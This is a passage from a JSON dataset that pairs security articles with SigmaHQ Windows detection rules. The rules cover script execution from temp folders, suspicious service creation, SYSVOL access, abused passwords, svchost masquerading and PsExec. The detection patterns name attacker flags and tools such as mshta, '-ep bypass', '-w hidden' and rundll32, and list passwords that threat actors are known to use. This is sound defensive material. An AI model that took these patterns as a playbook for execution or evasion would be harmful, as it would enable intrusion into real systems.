        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-russia-ukraine-military",
        "https://learn.microsoft.com/en-us/windows/win32/shell/csidl"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-02-08",
      "modified": "2023-06-16",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_proc_image": {
          "Image|endswith": [
            "\\cscript.exe",
            "\\mshta.exe",
            "\\wscript.exe"
          ]
        },
        "selection_proc_flags": {
          "CommandLine|contains": [
            " -ep bypass ",
            " -ExecutionPolicy bypass ",
            " -w hidden ",
            "/e:javascript ",
            "/e:Jscript ",
            "/e:vbscript "
          ]
        },
        "selection_proc_original": {
          "OriginalFileName": [
            "cscript.exe",
            "mshta.exe",
            "wscript.exe"
          ]
        },
        "selection_folders_1": {
          "CommandLine|contains": [
            ":\\Perflogs\\",
            ":\\Users\\Public\\",
            "\\AppData\\Local\\Temp",
            "\\AppData\\Roaming\\Temp",
            "\\Temporary Internet",
            "\\Windows\\Temp"
          ]
        },
        "selection_folders_2": [
          {
            "CommandLine|contains|all": [
              ":\\Users\\",
              "\\Favorites\\"
            ]
          },
          {
            "CommandLine|contains|all": [
              ":\\Users\\",
              "\\Favourites\\"
            ]
          },
          {
            "CommandLine|contains|all": [
              ":\\Users\\",
              "\\Contacts\\"
            ]
          }
        ],
        "condition": "1 of selection_proc_* and 1 of selection_folders_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_script_exec_from_env_folder.yml"
  },
  "569": {
    "url": "https://www.microsoft.com/en-us/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/",
    "markdown": "# Microsoft discovers threat actor targeting SolarWinds Serv-U software with 0-day exploit **Published on** July 13, 2021 --- Microsoft has detected a 0-day remote code execution exploit being used to attack SolarWinds Serv-U FTP software in limited and targeted attacks. The Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to DEV-0322, a group operating out of China, based on observed victimology, tactics, and procedures. The vulnerability being exploited is CVE-2021-35211, which was recently patched by SolarWinds. The vulnerability, which Microsoft reported to SolarWinds, exists in Serv-U’s implementation of the Secure Shell (SSH) protocol. If Serv-U’s SSH is",
    "sigma_rule": {
      "title": "Suspicious Script Execution From Temp Folder",
      "id": "a6a39bdb-935c-4f0a-ab77-35f4bbf44d33",
      "status": "test",
      "description": "Detects a suspicious script executions from temporary folder",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/"
      ],
      "author": "Florian Roth (Nextron Systems), Max Altgelt (Nextron Systems), Tim Shelton",
      "date": "2021-07-14",
      "modified": "2022-10-05",
      "tags": [
        "attack.execution",
        "attack.t1059"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\mshta.exe",
            "\\wscript.exe",
            "\\cscript.exe"
          ],
          "CommandLine|contains": [
            "\\Windows\\Temp",
            "\\Temporary Internet",
            "\\AppData\\Local\\Temp",
            "\\AppData\\Roaming\\Temp",
            "%TEMP%",
            "%TMP%",
            "%LocalAppData%\\Temp"
          ]
        },
        "filter": {
          "CommandLine|contains": [
            " >",
            "Out-File",
            "ConvertTo-Json",
            "-WindowStyle hidden -Verb runAs",
            "\\Windows\\system32\\config\\systemprofile\\AppData\\Local\\Temp\\Amazon\\EC2-Windows\\"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Administrative scripts"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_script_exec_from_temp.yml"
  },
  "570": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md",
    "markdown": "# T1543.003 - Windows Service ## Description from ATT&CK Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. (Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe),",
    "sigma_rule": {
      "title": "Suspicious New Service Creation",
      "id": "17a1be64-8d88-40bf-b5ff-a4f7a50ebcc8",
      "related": [
        {
          "id": "7fe71fc9-de3b-432a-8d57-8c809efc10ab",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects creation of a new service via \"sc\" command or the powershell \"new-service\" cmdlet with suspicious binary paths",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md",
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-14",
      "modified": "2022-11-18",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1543.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_sc": {
          "Image|endswith": "\\sc.exe",
          "CommandLine|contains|all": [
            "create",
            "binPath="
          ]
        },
        "selection_posh": {
          "CommandLine|contains|all": [
            "New-Service",
            "-BinaryPathName"
          ]
        },
        "susp_binpath": {
          "CommandLine|contains": [
            "powershell",
            "mshta",
            "wscript",
            "cscript",
            "svchost",
            "dllhost",
            "cmd ",
            "cmd.exe /c",
            "cmd.exe /k",
            "cmd.exe /r",
            "rundll32",
            "C:\\Users\\Public",
            "\\Downloads\\",
            "\\Desktop\\",
            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
            "C:\\Windows\\TEMP\\",
            "\\AppData\\Local\\Temp"
          ]
        },
        "condition": "1 of selection* and susp_binpath"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_service_creation.yml"
  },
  "571": {
    "url": "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
    "markdown": "# SANNY Malware Delivery Method Updated in Recently Observed Attacks **March 23, 2018** ### Introduction In the third week of March 2018, through FireEye’s Dynamic Threat Intelligence, FireEye discovered malicious macro-based Microsoft Word documents distributing SANNY malware to multiple governments worldwide. Each malicious document lure was crafted in regard to relevant regional geopolitical issues. FireEye has tracked the SANNY malware family since 2012 and believes that it is unique to a group focused on Korean Peninsula issues. This group has consistently targeted diplomatic entities worldwide, primarily using lure documents written in English and Russian. As part of these recently observed",
    "sigma_rule": {
      "title": "Suspicious New Service Creation",
      "id": "17a1be64-8d88-40bf-b5ff-a4f7a50ebcc8",
      "related": [
        {
          "id": "7fe71fc9-de3b-432a-8d57-8c809efc10ab",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects creation of a new service via \"sc\" command or the powershell \"new-service\" cmdlet with suspicious binary paths",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md",
        "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-14",
      "modified": "2022-11-18",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1543.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_sc": {
          "Image|endswith": "\\sc.exe",
          "CommandLine|contains|all": [
            "create",
            "binPath="
          ]
        },
        "selection_posh": {
          "CommandLine|contains|all": [
            "New-Service",
            "-BinaryPathName"
          ]
        },
        "susp_binpath": {
          "CommandLine|contains": [
            "powershell",
            "mshta",
            "wscript",
            "cscript",
            "svchost",
            "dllhost",
            "cmd ",
            "cmd.exe /c",
            "cmd.exe /k",
            "cmd.exe /r",
            "rundll32",
            "C:\\Users\\Public",
            "\\Downloads\\",
            "\\Desktop\\",
            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
            "C:\\Windows\\TEMP\\",
            "\\AppData\\Local\\Temp"
          ]
        },
        "condition": "1 of selection* and susp_binpath"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_service_creation.yml"
  },
  "572": {
    "url": "https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/",
    "markdown": "# Cobalt Strike, a Defender’s Guide **Categories:** CobaltStrike, Tools **Published on:** August 29, 2021 --- ## Intro In our research, we expose adversarial Tactics, Techniques, and Procedures (TTPs) as well as the tools they use to execute their mission objectives. In most of our cases, we see the threat actors utilizing Cobalt Strike. Therefore, defenders should know how to detect Cobalt Strike in various stages of its execution. The primary purpose of this post is to expose the most common techniques that we see from the intrusions that we track and provide detections. Having said that, not all of Cobalt",
    "sigma_rule": {
      "title": "Process Creation Using Sysnative Folder",
      "id": "3c1b5fb0-c72f-45ba-abd1-4d4c353144ab",
      "status": "test",
      "description": "Detects process creation events that use the Sysnative folder (common for CobaltStrike spawns)",
      "references": [
        "https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/"
      ],
      "author": "Max Altgelt (Nextron Systems)",
      "date": "2022-08-23",
      "modified": "2023-12-14",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1055"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "sysnative": [
          {
            "CommandLine|contains": ":\\Windows\\Sysnative\\"
          },
          {
            "Image|contains": ":\\Windows\\Sysnative\\"
          }
        ],
        "condition": "sysnative"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_sysnative.yml"
  },
  "573": {
    "url": "https://adsecurity.org/?p=2288",
    "markdown": "# Finding Passwords in SYSVOL & Exploiting Group Policy Preferences **Published on** December 28, 2015 **Categories:** Exploit, Microsoft Security, Technical Reference At Black Hat and DEF CON this year, I spoke about ways attackers go from Domain User to Domain Admin in modern enterprises. Every Windows computer has a built-in Administrator account with an associated password. Changing this password is a security requirement in most organizations, though the method for doing so is not straight-forward. A standard method is to use Group Policy to set the local Administrator password across a large number of workstations. A major issue with this",
    "sigma_rule": {
      "title": "Suspicious SYSVOL Domain Group Policy Access",
      "id": "05f3c945-dcc8-4393-9f3d-af65077a8f86",
      "status": "test",
      "description": "Detects Access to Domain Group Policies stored in SYSVOL",
      "references": [
        "https://adsecurity.org/?p=2288",
        "https://www.hybrid-analysis.com/sample/f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5?environmentId=100"
      ],
      "author": "Markus Neis, Jonhnathan Ribeiro, oscd.community",
      "date": "2018-04-09",
      "modified": "2022-01-07",
      "tags": [
        "attack.credential-access",
        "attack.t1552.006"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "\\SYSVOL\\",
            "\\policies\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Administrative activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_sysvol_access.yml"
  },
  "574": {
    "url": "https://www.hybrid-analysis.com/sample/f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5?environmentId=100",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious SYSVOL Domain Group Policy Access",
      "id": "05f3c945-dcc8-4393-9f3d-af65077a8f86",
      "status": "test",
      "description": "Detects Access to Domain Group Policies stored in SYSVOL",
      "references": [
        "https://adsecurity.org/?p=2288",
        "https://www.hybrid-analysis.com/sample/f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5?environmentId=100"
      ],
      "author": "Markus Neis, Jonhnathan Ribeiro, oscd.community",
      "date": "2018-04-09",
      "modified": "2022-01-07",
      "tags": [
        "attack.credential-access",
        "attack.t1552.006"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "\\SYSVOL\\",
            "\\policies\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Administrative activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_sysvol_access.yml"
  },
  "575": {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments",
    "markdown": "# New Wave of Espionage Activity Targets Asian Governments **Governments and state-owned organizations are the latest targets of a well-established threat actor.** Posted: 13 Sep, 2022 --- A distinct group of espionage attackers who were formerly associated with the ShadowPad remote access Trojan (RAT) has adopted a new, diverse toolset to mount an ongoing campaign against a range of government and state-owned organizations in a number of Asian countries. The attacks, which have been underway since at least early 2021, appear to have intelligence gathering as their main goal. ## Targets The current campaign appears to be almost exclusively focused",
    "sigma_rule": {
      "title": "Weak or Abused Passwords In CLI",
      "id": "91edcfb1-2529-4ac2-9ecc-7617f895c7e4",
      "status": "test",
      "description": "Detects weak passwords or often abused passwords (seen used by threat actors) via the CLI.\nAn example would be a threat actor creating a new user via the net command and providing the password inline\n",
      "references": [
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments",
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/",
        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-14",
      "modified": "2024-02-23",
      "tags": [
        "attack.defense-evasion",
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "123456789",
            "123123qwE",
            "Asd123.aaaa",
            "Decryptme",
            "P@ssw0rd!",
            "Pass8080",
            "password123",
            "test@202"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate usage of the passwords by users via commandline (should be discouraged)",
        "Other currently unknown false positives"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_weak_or_abused_passwords.yml"
  },
  "576": {
    "url": "https://thedfirreport.com/2022/09/26/bumblebee-round-two/",
    "markdown": "# BumbleBee: Round Two **Categories:** adfind, bumblebee, cobaltstrike, Meterpreter **Published on:** September 26, 2022 In this intrusion from May 2022, the threat actors used BumbleBee as the initial access vector. BumbleBee has been identified as an initial access vector utilized by several ransomware affiliates. In this intrusion, we see the threat actor use BumbleBee to deploy Cobalt Strike and Meterpreter. The threat actor then used RDP and SMB to move around the network looking at backup systems and file shares before being evicted from the network. ## Case Summary The intrusion began with the delivery of an ISO file containing",
    "sigma_rule": {
      "title": "Weak or Abused Passwords In CLI",
      "id": "91edcfb1-2529-4ac2-9ecc-7617f895c7e4",
      "status": "test",
      "description": "Detects weak passwords or often abused passwords (seen used by threat actors) via the CLI.\nAn example would be a threat actor creating a new user via the net command and providing the password inline\n",
      "references": [
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments",
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/",
        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-14",
      "modified": "2024-02-23",
      "tags": [
        "attack.defense-evasion",
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "123456789",
            "123123qwE",
            "Asd123.aaaa",
            "Decryptme",
            "P@ssw0rd!",
            "Pass8080",
            "password123",
            "test@202"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate usage of the passwords by users via commandline (should be discouraged)",
        "Other currently unknown false positives"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_weak_or_abused_passwords.yml"
  },
  "577": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/",
    "markdown": "### DEV-0832 (Vice Society) opportunistic ransomware campaigns impacting US education sector **By** Microsoft Threat Intelligence **October 25, 2022** --- #### April 2023 update **Microsoft Threat Intelligence** has shifted to a new threat actor naming taxonomy aligned around the theme of weather. **DEV-0832** is now tracked as **Vanilla Tempest**. To learn about how the new taxonomy represents the origin, unique traits, and impact of threat actors, and to get a complete mapping of threat actor names, read this blog: **Microsoft shifts to a new threat actor naming taxonomy**. --- In recent months, Microsoft has detected active ransomware and extortion campaigns impacting",
    "sigma_rule": {
      "title": "Weak or Abused Passwords In CLI",
      "id": "91edcfb1-2529-4ac2-9ecc-7617f895c7e4",
      "status": "test",
      "description": "Detects weak passwords or often abused passwords (seen used by threat actors) via the CLI.\nAn example would be a threat actor creating a new user via the net command and providing the password inline\n",
      "references": [
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments",
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/",
        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-14",
      "modified": "2024-02-23",
      "tags": [
        "attack.defense-evasion",
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "123456789",
            "123123qwE",
            "Asd123.aaaa",
            "Decryptme",
            "P@ssw0rd!",
            "Pass8080",
            "password123",
            "test@202"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate usage of the passwords by users via commandline (should be discouraged)",
        "Other currently unknown false positives"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_weak_or_abused_passwords.yml"
  },
  "578": {
    "url": "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708",
    "markdown": "# SlashAndGrab: ScreenConnect Post-Exploitation in the Wild (CVE-2024-1709 & CVE-2024-1708) **February 23, 2024** --- ## Table of Contents: - Adversaries Deploying Ransomware - Adversaries Enumerating - Adversary Cryptocurrency Miners - Adversaries Installing Additional Remote Access - Downloading Tools and Payloads - Adversaries Dropping Cobalt Strike - Adversaries Persisting - Wrapping Up - Appendix --- Since February 19, Huntress has been sharing technical details of the ScreenConnect vulnerability we’re calling “SlashAndGrab.” In previous posts, we shared the details of this vulnerability, its exploit, and shared detection guidance. In this article, we’ve collected and curated threat actor activity fresh from the Huntress",
    "sigma_rule": {
      "title": "Weak or Abused Passwords In CLI",
      "id": "91edcfb1-2529-4ac2-9ecc-7617f895c7e4",
      "status": "test",
      "description": "Detects weak passwords or often abused passwords (seen used by threat actors) via the CLI.\nAn example would be a threat actor creating a new user via the net command and providing the password inline\n",
      "references": [
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments",
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/",
        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-14",
      "modified": "2024-02-23",
      "tags": [
        "attack.defense-evasion",
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "123456789",
            "123123qwE",
            "Asd123.aaaa",
            "Decryptme",
            "P@ssw0rd!",
            "Pass8080",
            "password123",
            "test@202"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate usage of the passwords by users via commandline (should be discouraged)",
        "Other currently unknown false positives"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_susp_weak_or_abused_passwords.yml"
  },
  "579": {
    "url": "https://web.archive.org/web/20180718061628/https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2",
    "markdown": "# Blue Team Fundamentals Part Two: Windows Processes In part one I touched on logging and the importance of working with what you have already got, rather than trying to reinvent the wheel. There is no point adding more logs if you’re not looking at what is already there. The same can be said for what a vast amount of businesses have in one form or another, Microsoft Windows. There is a lot of information to be gleaned from Windows processes. The thing with processes is that there are a lot of them, and it can seem massively overwhelming. However,",
    "sigma_rule": {
      "title": "Suspect Svchost Activity",
      "id": "16c37b52-b141-42a5-a3ea-bbe098444397",
      "status": "test",
      "description": "It is extremely abnormal for svchost.exe to spawn without any CLI arguments and is normally observed when a malicious process spawns the process and injects code into the process memory space.",
      "references": [
        "https://web.archive.org/web/20180718061628/https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2"
      ],
      "author": "David Burkett, @signalblur",
      "date": "2019-12-28",
      "modified": "2022-06-27",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1055"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|endswith": "svchost.exe",
          "Image|endswith": "\\svchost.exe"
        },
        "filter": [
          {
            "ParentImage|endswith": [
              "\\rpcnet.exe",
              "\\rpcnetp.exe"
            ]
          },
          {
            "CommandLine": null
          }
        ],
        "condition": "selection and not filter"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Rpcnet.exe / rpcnetp.exe which is a lojack style software. https://www.blackhat.com/docs/us-14/materials/us-14-Kamlyuk-Kamluk-Computrace-Backdoor-Revisited.pdf"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_svchost_execution_with_no_cli_flags.yml"
  },
  "580": {
    "url": "https://tria.ge/240731-jh4crsycnb/behavioral2",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Process Masquerading As SvcHost.EXE",
      "id": "be58d2e2-06c8-4f58-b666-b99f6dc3b6cd",
      "related": [
        {
          "id": "01d2e2a1-5f09-44f7-9fc1-24faa7479b6d",
          "type": "similar"
        },
        {
          "id": "e4a6b256-3e47-40fc-89d2-7a477edd6915",
          "type": "similar"
        }
      ],
      "status": "experimental",
      "description": "Detects a suspicious process that is masquerading as the legitimate \"svchost.exe\" by naming its binary \"svchost.exe\" and executing from an uncommon location.\nAdversaries often disguise their malicious binaries by naming them after legitimate system processes like \"svchost.exe\" to evade detection.\n",
      "references": [
        "https://tria.ge/240731-jh4crsycnb/behavioral2",
        "https://redcanary.com/blog/threat-detection/process-masquerading/"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-08-07",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\svchost.exe"
        },
        "filter_main_img_location": {
          "Image": [
            "C:\\Windows\\System32\\svchost.exe",
            "C:\\Windows\\SysWOW64\\svchost.exe"
          ]
        },
        "filter_main_ofn": {
          "OriginalFileName": "svchost.exe"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_svchost_masqueraded_execution.yml"
  },
  "581": {
    "url": "https://redcanary.com/blog/threat-detection/process-masquerading/",
    "markdown": "# Catch me if you code: how to detect process masquerading _A detection engineer’s guide to the not-so-brilliant disguises that threat actors use when masquerading malware payloads._ Originally published February 9, 2021. Last modified April 30, 2024. --- Pretending, adapting, and masquerading are all techniques you may be familiar with from the movies. These tactics and behaviors let characters accomplish their prerogatives without drawing too much attention to themselves. A prime example is Leonardo DiCaprio’s character in the 2002 film _Catch Me If You Can_, who disguises himself under different personas in order to cultivate his empire built on fraud",
    "sigma_rule": {
      "title": "Suspicious Process Masquerading As SvcHost.EXE",
      "id": "be58d2e2-06c8-4f58-b666-b99f6dc3b6cd",
      "related": [
        {
          "id": "01d2e2a1-5f09-44f7-9fc1-24faa7479b6d",
          "type": "similar"
        },
        {
          "id": "e4a6b256-3e47-40fc-89d2-7a477edd6915",
          "type": "similar"
        }
      ],
      "status": "experimental",
      "description": "Detects a suspicious process that is masquerading as the legitimate \"svchost.exe\" by naming its binary \"svchost.exe\" and executing from an uncommon location.\nAdversaries often disguise their malicious binaries by naming them after legitimate system processes like \"svchost.exe\" to evade detection.\n",
      "references": [
        "https://tria.ge/240731-jh4crsycnb/behavioral2",
        "https://redcanary.com/blog/threat-detection/process-masquerading/"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-08-07",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\svchost.exe"
        },
        "filter_main_img_location": {
          "Image": [
            "C:\\Windows\\System32\\svchost.exe",
            "C:\\Windows\\SysWOW64\\svchost.exe"
          ]
        },
        "filter_main_ofn": {
          "OriginalFileName": "svchost.exe"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_svchost_masqueraded_execution.yml"
  },
  "582": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
    "markdown": "# Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser **October 28, 2020** --- Throughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise. Effective and fast detection of these campaigns is key to mitigating this threat. The malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT, and WINEKEY/CORKBOT. While these",
    "sigma_rule": {
      "title": "Psexec Execution",
      "id": "730fc21b-eaff-474b-ad23-90fd265d4988",
      "status": "test",
      "description": "Detects user accept agreement execution in psexec commandline",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "omkar72",
      "date": "2020-10-30",
      "modified": "2023-02-28",
      "tags": [
        "attack.execution",
        "attack.t1569",
        "attack.t1021"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "\\psexec.exe"
          },
          {
            "OriginalFileName": "psexec.c"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Administrative scripts."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psexec_execution.yml"
  },
  "583": {
    "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec",
    "markdown": "# PsExec v2.43 Published: April 11, 2023 **Download PsTools** (5 MB) ## Introduction Utilities like Telnet and remote control programs like Symantec's PC Anywhere let you execute programs on remote systems, but they can be a pain to set up and require that you install client software on the remote systems that you wish to access. PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. PsExec's most powerful uses include launching interactive command-prompts on remote systems and remote-enabling tools like IpConfig that",
    "sigma_rule": {
      "title": "PsExec/PAExec Escalation to LOCAL SYSTEM",
      "id": "8834e2f7-6b4b-4f09-8906-d2276470ee23",
      "related": [
        {
          "id": "207b0396-3689-42d9-8399-4222658efc99",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious commandline flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec",
        "https://www.poweradmin.com/paexec/",
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
